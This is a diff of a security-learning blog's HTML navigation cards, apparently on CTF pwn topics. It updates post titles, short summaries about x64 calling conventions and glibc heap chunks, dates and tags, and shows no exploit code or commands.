-                        <span class="card-title">蒸米X64</span>
+                        <span class="card-title">Heap--初探--bins神将</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1：X86 X64主要区别
-首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常
-其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参</div>
+                    <div class="summary">Previously on Heap–初探–chunk的获取与释放：我们当时最大的疑惑差不多就是Free后的chunks都怎么了，这里来逐一解答。
+前情提要ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-07
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -718,6 +632,7 @@ $  </code></pre>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -736,22 +651,20 @@ $  </code></pre>
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/06/wiki-ret2libc2/">
+                <a href="/2020/09/07/heap-chu-tan-chunk-de-huo-qu-yu-shi-fang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="wiki-ret2libc2">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Heap--初探--chunk的获取与释放">
                         
-                        <span class="card-title">wiki-ret2libc2</span>
+                        <span class="card-title">Heap--初探--chunk的获取与释放</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1：checksechunter@hunter:~/PWN/wiki/overflow$ checksec ret2libc2
-[*] '/home/hunter/PWN/wiki/overflow/ret2libc2'
-    Arch:</div>
+                    <div class="summary">什么是堆堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。其生长方</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-06
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-07
                             </span>
                         <span class="publish-author">
                             
@@ -768,8 +681,8 @@ $  </code></pre>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/wiki-pwn/" target="_blank">
-                        <span class="chip bg-color">wiki--pwn</span>
+                    <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
+                        <span class="chip bg-color">原理学习</span>
                     </a>
                     
                 </div>
